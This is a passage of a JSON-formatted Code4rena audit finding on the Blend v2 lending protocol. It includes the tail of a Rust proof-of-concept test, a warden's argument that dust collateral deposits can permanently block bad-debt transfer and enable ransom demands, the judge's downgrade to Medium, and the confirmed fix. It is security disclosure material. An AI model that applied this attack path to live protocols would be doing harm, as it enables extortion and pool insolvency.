block liquidation of the dust\n    // thus blocking bad debt transfer\n\n    let auction_result = pool_fixture.pool.try_new_auction(\n        &0,\n        &samwise,\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::STABLE].address.clone(),\n        ],\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::WETH].address.clone(),\n        ],\n        &liq_pct,\n    );\n    assert!(auction_result.is_err());\n}\n```\n\n### Recommended mitigation steps\n\nAdding a minimum collateral allowed in the deposit is not enough since it still leaves the ability to DDOS moving the bad debt by depositing the minimum amount and forcing another liquidation auction.\n\nWe need to always check the health factor when collateral is added if liabilities exist. Disallow collateral deposits if liabilities > collateral after the deposit.\n\n**[monrel (warden) commented](https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-187?commentParent=ERsyaagho48):**\n\n> I believe this has been overlooked because it has been duplicated with [S-188](https://code4rena.com/evaluate/2025-02-blend-v2-audit-certora-formal-verification/submissions/S-188). I will argue that this is a separate issue that is of High severity.\n>\n> S-188 has identified one root cause:\n>\n> 1. It is possible to deposit dust to block debt removal but it requires constant front-running each time an auction is completed.\n>\n> It has already been established that the above is of low severity since it requires constant front-running to block the removal briefly.\n>\n> I show much more severe issue that is based on two root causes:\n>\n> 1. It is possible to deposit dust to block debt removal.\n> 2. It is impossible to liquidate dust position.\n>\n> By combining 1. and 2. we get the following result:\n>\n> It is possible to permanently block debt removal by depositing dust amount after an auction is completed since a liquidation can not be created. This is a block that can only be lifted by the owner of that position by depositing more collateral to make it possible to create a liquidation auction. I show this in the POC of my original issue.\n>\n> The revert happens it is in the following call:\n>\n> [src/auctions/user*liquidation*auction.rs# L127](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/pool/src/auctions/user_liquidation_auction.rs# L127)\n>\n> \n```\n\n> let avg_cf = position_data_inc.collateral_base.fixed_div_floor(\n>         e,\n>         &position_data_inc.collateral_raw,\n>         &position_data_inc.scalar,\n> );\n> \n```\n\n>\n> A revert happens in `scale_mul_div_floor()` in the `i128.rs` file due to an attempt to `unwrap()` `None`. This happens because both `position_data_inc.collateral_base` and `position_data_inc.collateral_raw` have been rounded down to 0.\n>\n> This report show permanent block off removal of debt which essentially means that the pools can be insolvent even when they should be solvent with the the backstop “insurance”.\n>\n> An attacker can use this as an attack path to blackmail pool owners. Any user with bad debt using a smart contract wallet can simply update the smart contract wallet into a contract that will ONLY allow the debt to be released if a ransom sum is deposited.\n>\n> The attacker can create a closed system where the only way to remove the debt is to pay the ransom.\n>\n> See this [gist](https://gist.github.com/0xmonrel/99713fbecbb942fb7f69c0a9f2ecd9a9) for a graphic explaining it.\n>\n> I believe this is HIGH based on either the insolvency risk and the ability for attackers to profit on the attack based on the following C4 rules\n>\n> \n```\n\n> - Med:Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n>\n> - High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> \n```\n\n>\n> There is no external requirements, it can be done by any user that has accumulated bad debt.\n>\n> I have demonstrated that this has a separate root cause and much more severe consequences than the duplicate, I therefore, believe that it should be a separate issue.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-187?commentParent=ERsyaagho48&commentChild=NU3Mc3oDwZp):**\n\n> I agree this one can be treated separate, but it doesn’t fit as a high risk. It requires circumstances and the impact isn’t terribly high for the user. Reinstating as a valid medium.\n\n**[Blend mitigated](https://github.com/code-423n4/2025-04-blend-mitigation?tab=readme-ov-file# mitigation-of-high--medium-severity-issues):**\n\n> [Commit to Initial Fix](https://github.com/blend-capital/blend-contracts-v2/commit/59acbc9364b50ec9da4b8f1f3065abe4faba2d79), [Commit to Simplification of fix](https://github.com/blend-capital/blend-contracts-v2/commit/857249fdd372e344fd033ba2fe8adbb619eb5b31) to automatically attribute bad debt if necessary after a user liquidation completes to prevent the dos window from existing.\n\n**Status:** Mitigation confirmed. Full details in reports from [0xAlix2](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-15), [0x007](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-49) and [rscodes](https://code4rena.com/audits/2025-04-blend-v2-mitigation-review/submissions/S-83).\n\n---\n\n",
    "summary": "\nThe bug report describes an issue with the process of moving bad debt to the backstop in the Blend contract. This process can be blocked by the owner of a position by depositing a small amount of tokens as collateral. This not only prevents the bad debt from being moved, but also blocks liquidation of the small amount of collateral. This can be used by the owner to blackmail or take payments from others in the pool. The severity of this issue was initially considered high, but was later decreased to medium. The Blend team has implemented a mitigation to prevent this issue from occurring.",
    "report_date": "2025-08-13T00:00:00.000Z",
    "contest_prize_txt": "125000",
    "contest_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
    "sponsor_name": "Blend",
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification",
    "github_link": "https://code4rena.com/audits/2025-02-blend-v2-audit-certora-formal-verification/submissions/F-187",
    "pdf_link": "",
    "pdf_page_from": 0,
    "contest_id": "492",
    "slug": "m-17-bad-debt-can-be-permanently-blocked-from-being-moved-to-backstop-code4rena-blend-blend-git",
    "firm_name": "Code4rena",
    "firm_logo_square": "code4rena_square.png",
    "protocol_name": "Blend",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "monrel"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
    },
    "protocols_protocol": {
        "name": "Blend",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}